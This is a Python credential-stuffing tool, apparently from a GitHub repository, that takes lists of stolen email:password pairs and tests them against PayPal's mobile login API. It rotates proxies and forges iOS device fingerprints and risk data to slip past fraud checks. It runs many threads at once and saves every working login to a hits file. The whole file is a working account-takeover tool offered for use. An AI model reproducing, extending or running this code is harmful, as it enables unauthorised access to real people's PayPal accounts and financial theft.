import os, time, itertools, threading, requests, tkinter
from tkinter import filedialog

root = tkinter.Tk()
root.withdraw()
lock = threading.Lock()

class Paypal:
    def __init__(self):
        self.combos = []
        self.proxies = itertools.cycle(open('./data/proxies.txt').read().splitlines())
        self.client = requests.Session()
        self.hits, self.bad, self.twofa, self.retries = 0, 0, 0, 0

    def banner(self):
        os.system(f'cls && title PayPal Mail Access ^| github.com/Plasmonix')
        print(f'''
                                                        \x1b[38;5;63m ╔═╗╔═╗╦ ╦╔═╗╔═╗╦   
                                                        \x1b[38;5;63m ╠═╝╠═╣╚╦╝╠═╝╠═╣║  
                                                        \x1b[38;5;63m ╩  ╩ ╩ ╩ ╩  ╩ ╩╩═╝
                                                            \u001b[0mMail \x1b[\x1b[38;5;63mAccess\u001b[0m
                                                        ''')

    def update_title(self):
        while True:
            self.timenow = time.strftime("%H:%M:%S", time.localtime())
            os.system(f'title PayPal - Hits: {self.hits} ^| Bad: {self.bad} ^| 2FA: {self.twofa} ^| Retries: {self.retries} ^| Threads: {threading.active_count() - 2}')
            time.sleep(0.4)

    def load_combos(self):
        try:
            input(f'\u001b[0m[\x1b[\x1b[38;5;63m#\u001b[0m] Press ENTER to select combos')
            combo_list = filedialog.askopenfile(parent=root, mode='rb', title='Choose a combo file', filetype=(('txt', '*.txt'), ('All files', '*.txt')))
            with open(combo_list.name, 'r+', encoding='utf-8') as fp:
                for l in fp.readlines():
                     self.combos.append(l.replace('\n', ''))
        except:
            print('[\x1b[31m!\x1b[0m] Please select valid combo file')
    
    def checker(self, combos):
        for i in combos:
            try:
                email, password = i.split(':', 2)
                headers = {
				            'Content-Type': 'application/x-www-form-urlencoded',
				            'Paypal-Client-Metadata-Id': '7e414acd7909416db4ddc61f36ac689e',
				            'Accept': 'application/json',
				            'X-Paypal-Consumerapp-Context': '%20%7B%22deviceLocationCountry%22%3A%22US%22%2C%22deviceLocale%22%3A%22english%22%2C%22deviceOSVersion%22%3A%2213.5%22%2C%22deviceLanguage%22%3A%22en-US%22%2C%22appGuid%22%3A%22B44DA023-8872-4961-9BD3-DF220E915D1C%22%2C%22deviceId%22%3A%22D002CF30-09C0-4D7E-9085-DC2510E145AB%22%2C%22deviceType%22%3A%22iOS%22%2C%22deviceNetworkCarrier%22%3A%22Verizon%22%2C%22deviceModel%22%3A%22iPhone%22%2C%22appName%22%3A%22com.yourcompany.PPClient%22%2C%22deviceOS%22%3A%22iOS%22%2C%22visitorId%22%3A%22B44DA023-8872-4961-9BD3-DF220E915D1C%22%2C%22deviceNetworkType%22%3A%22Unknown%22%2C%22usageTrackerSessionId%22%3A%2256A2CF37-1F14-4B3D-9065-D70268A6D37B%22%2C%22appVersion%22%3A%228.2.2%22%2C%22sdkVersion%22%3A%221.0.0%22%2C%22deviceMake%22%3A%22Apple%22%7D',
				            'Authorization': 'Basic QVY4aGRCQk04MHhsZ0tzRC1PYU9ReGVlSFhKbFpsYUN2WFdnVnB2VXFaTVRkVFh5OXBtZkVYdEUxbENxOg==',
				            'accept-language': 'en-US',
				            'Accept-Encoding': 'gzip deflate',
				            'X-Paypal-Mobileapp': 'dmz-access-header',
				            'Paypal-Request-Id': '1a9154e6b56f43e69f8a96045c33d2ff',
				            'User-Agent': 'PayPal/74 (iPhone; iOS 13.5; Scale/2.00)'
			            }
                
                data = f'?timeStamp=1630995621211&grantType=password&firstPartyClientAccessToken=A21AAMvAFdCh_wzage8zKXYTT8DBdRy0D4sbmkiKiaEGZ7P_CqKtdPQeLGnBQNUXSIK3nBVmUnDKtZQNxdj-xhpRvhqmJ1fQg&deviceInfo=%7B%22device_identifier%22%3A%22B44DA023-8872-4961-9BD3-DF220E915D1C%22%2C%22device_name%22%3A%22v0id%22%2C%22device_type%22%3A%22iOS%22%2C%22device_key_type%22%3A%22APPLE_PHONE%22%2C%22device_model%22%3A%22iPhone%22%2C%22device_os%22%3A%22iOS%22%2C%22device_os_version%22%3A%2213.5%22%2C%22is_device_simulator%22%3Afalse%2C%22pp_app_id%22%3A%22APP-3P637985EF709422H%22%7D&adsChallengeId=auth-B44DA023-8872-4961-9BD3-DF220E915D1C&authNonce=iRcHcbnucMD1HEfRVMqMRAFoPJSHkYSPisAan9UGwvA%3D&firstPartyClientId=d3aacf450dd6aa992cfba77067560733&postLoginConfig=%7B%22experimentDetails%22%3A%7B%22res%22%3A%22digital_wallet_consumer_client%22%2C%22app%22%3A%22%22%2C%22filters%22%3A%5B%7B%22name%22%3A%22component%22%2C%22value%22%3A%22consapp%22%7D%5D%7D%2C%22configNames%22%3A%5B%22digitalWalletConfig.digitalwalletexperience%22%5D%7D&appInfo=%7B%22device_app_id%22%3A%22com.yourcompany.PPClient%22%2C%22client_platform%22%3A%22Apple%22%2C%22app_version%22%3A%228.2.2%22%2C%22app_category%22%3A3%2C%22app_guid%22%3A%22B44DA023-8872-4961-9BD3-DF220E915D1C%22%2C%22push_notification_id%22%3A%22disabled%22%7D&password={password}&redirectUri=urn%3Aietf%3Awg%3Aoauth%3A2.0%3Aoob&riskData=%7B%22total_storage_space%22%3A63978983424%2C%22linker_id%22%3A%22760d2932-66b3-42db-a256-5fb401bd4646%22%2C%22bindSchemeEnrolled%22%3A%22none%22%2C%22local_identifier%22%3A%22813df9f0-140d-487f-b4ba-3dee3b89a732%22%2C%22screen%22%3A%7B%22brightness%22%3A%2240%22%2C%22height%22%3A1334%2C%22mirror%22%3Afalse%2C%22scale%22%3A%222.0%22%2C%22capture%22%3A0%2C%22width%22%3A750%2C%22max_frames%22%3A60%7D%2C%22conf_version%22%3A%225.0%22%2C%22timestamp%22%3A1630995621177%2C%22comp_version%22%3A%225.3.0%22%2C%22os_type%22%3A%22iOS%22%2C%22is_rooted%22%3Atrue%2C%22payload_type%22%3A%22full%22%2C%22ip_addresses%22%3A%5B%22fe80%3A%3Acf0%3A7688%3Aa200%3A52d4%22%2C%22172.20.10.4%22%2C%22fe80%3A%3Ae068%3A71ff%3Afe98%3A3f2f%22%2C%22fe80%3A%3A7182%3Aaf1d%3A3e52%3A1b8e%22%2C%22fe80%3A%3A8512%3Ac906%3Af8e2%3A9326%22%5D%2C%22device_name%22%3A%22v0id%22%2C%22locale_lang%22%3A%22ar%22%2C%22c%22%3A32%2C%22app_version%22%3A%228.2.2%22%2C%22sr%22%3A%7B%22gy%22%3Atrue%2C%22mg%22%3Atrue%2C%22ac%22%3Atrue%7D%2C%22conf_url%22%3A%22https%3A%5C%2F%5C%2Fwww.paypalobjects.com%5C%2FrdaAssets%5C%2Fmagnes%5C%2Fmagnes_ios_rec.json%22%2C%22os_version%22%3A%2213.5%22%2C%22tz_name%22%3A%22Asia%5C%2FAmman%22%2C%22battery%22%3A%7B%22state%22%3A2%2C%22low_power%22%3A0%2C%22level%22%3A%220.81%22%7D%2C%22user_agent%22%3A%7B%22dua%22%3A%22Mozilla%5C%2F5.0%20%28iPhone%3B%20CPU%20iPhone%20OS%2013_5%20like%20Mac%20OS%20X%29%20AppleWebKit%5C%2F605.1.15%20%28KHTML%2C%20like%20Gecko%29%20Mobile%5C%2F15E148%22%7D%2C%22cpu%22%3A%7B%22activecores%22%3A2%2C%22cores%22%3A2%2C%22state%22%3A0%7D%2C%22ds%22%3Atrue%2C%22tz%22%3A10800000%2C%22TouchIDAvailable%22%3A%22true%22%2C%22vendor_identifier%22%3A%22D002CF30-09C0-4D7E-9085-DC2510E145AB%22%2C%22memory%22%3A%7B%22total%22%3A2105016320%7D%2C%22sms_enabled%22%3Atrue%2C%22magnes_guid%22%3A%7B%22id%22%3A%22d2096fd6-563a-40f5-b397-feda4bff3c34%22%2C%22created_at%22%3A1630973128059%7D%2C%22disk%22%3A%7B%22total%22%3A63978983424%2C%22free%22%3A36076568576%7D%2C%22app_guid%22%3A%22B44DA023-8872-4961-9BD3-DF220E915D1C%22%2C%22system%22%3A%7B%22hardware%22%3A%22arm64%20v8%22%2C%22version%22%3A%2217F75%22%2C%22system_type%22%3A%22arm64%2064%20bit%22%2C%22name%22%3A%22N71AP%22%7D%2C%22pin_lock_last_timestamp%22%3A1630995603069%2C%22source_app_version%22%3A%228.2.2%22%2C%22bindSchemeAvailable%22%3A%22crypto%3Akmli%2Cbiometric%3Afingerprint%22%2C%22risk_comp_session_id%22%3A%22f5ebc7fc-3de5-4b0d-9786-e2434f56b60a%22%2C%22magnes_source%22%3A10%2C%22device_model%22%3A%22iPhone8%2C1%22%2C%22mg_id%22%3A%22e09f4d0d020c349c26c0f0999d460e1e%22%2C%22proxy_setting%22%3A%22host%3D172.20.10.11%2Cport%3D8089%2Ctype%3DkCFProxyTypeHTTPS%22%2C%22email_configured%22%3Afalse%2C%22device_uptime%22%3A61227499%2C%22rf%22%3A%2211011%22%2C%22dbg%22%3Afalse%2C%22cloud_identifier%22%3A%2261851f2d-5061-49f9-a510-972076107601%22%2C%22PasscodeSet%22%3A%22true%22%2C%22is_emulator%22%3Afalse%2C%22t%22%3Atrue%2C%22locale_country%22%3A%22JO%22%2C%22ip_addrs%22%3A%22172.20.10.4%22%2C%22app_id%22%3A%22com.yourcompany.PPClient%22%2C%22pairing_id%22%3A%2208dbd356968d4e64b540848e620ae3f3%22%2C%22conn_type%22%3A%22wifi%22%2C%22TouchIDEnrolled%22%3A%22false%22%2C%22dc_id%22%3A%228e2305b5387bacbea93c339fd6b1730d%22%2C%22location_auth_status%22%3A%22unknown%22%7D&rememberMe=false&email={email}'
                res = self.client.post('https://api-m.paypal.com/v1/mfsauth/proxy-auth/token', headers=headers, json=data, proxies={"https": f"http://{next(self.proxies)}"}, timeout=5)

                if '"Check your info and try again."' in res.text:
                    lock.acquire()
                    print(f'\u001b[0m[\x1b[\x1b[38;5;63m{self.timenow}\u001b[0m] \x1b[31mBAD\x1b[0m | {email} | {password}')
                    self.bad += 1
                    lock.release()
                    
                elif '"For your protection, we have temporarily closed your account."' in res.text:
                    lock.acquire()
                    print(f'\u001b[0m[\x1b[\x1b[38;5;63m{self.timenow}\u001b[0m] \x1b31mINACTIVE\x1b[0m | {email} | {password}')
                    lock.release()

                elif '"firstPartyUserAccessToken"' in res.text or '"phones"' in res.text:
                    lock.acquire()
                    print(f'\u001b[0m[\x1b[\x1b[38;5;63m{self.timenow}\u001b[0m] [\x1b32mGOOD\x1b[0m] | {email} | {password}')
                    with open('./data/hits.txt', 'a+', encoding='utf-8') as fp:
                        fp.writelines(f'Email: {email} Password: {password}\n')
                    self.hits += 1
                    lock.release()
                
                elif 'challenge' in res.text:
                    lock.acquire()
                    print(f'\u001b[0m[\x1b[\x1b[38;5;63m{self.timenow}\u001b[0m] \x1b[31m2FA\x1b[0m | {email} | {password}')
                    self.twofa += 1
                    lock.release()

            except:
                lock.acquire()
                print(f'[\x1b[31m!\x1b[0m] Could not establish connection.')
                self.retries += 1
                lock.release()

    def worker(self, slice):
        return [slice[i::self.thread_count] for i in range(self.thread_count)]

    def main(self):
        self.banner()
        self.load_combos()
        self.thread_count = int(input(f'\u001b[0m[\x1b[\x1b[38;5;63m?\u001b[0m] Threads> '))
        self.banner()
        threading.Thread(target=self.update_title).start()
        threads = []
        for i in range(self.thread_count):
            threads.append(threading.Thread(target=self.checker, args=[self.worker(self.combos)[i]]))
            threads[i].start()
        for thread in threads:
            thread.join()
        
if __name__ == '__main__':
    x = Paypal()
    x.main()
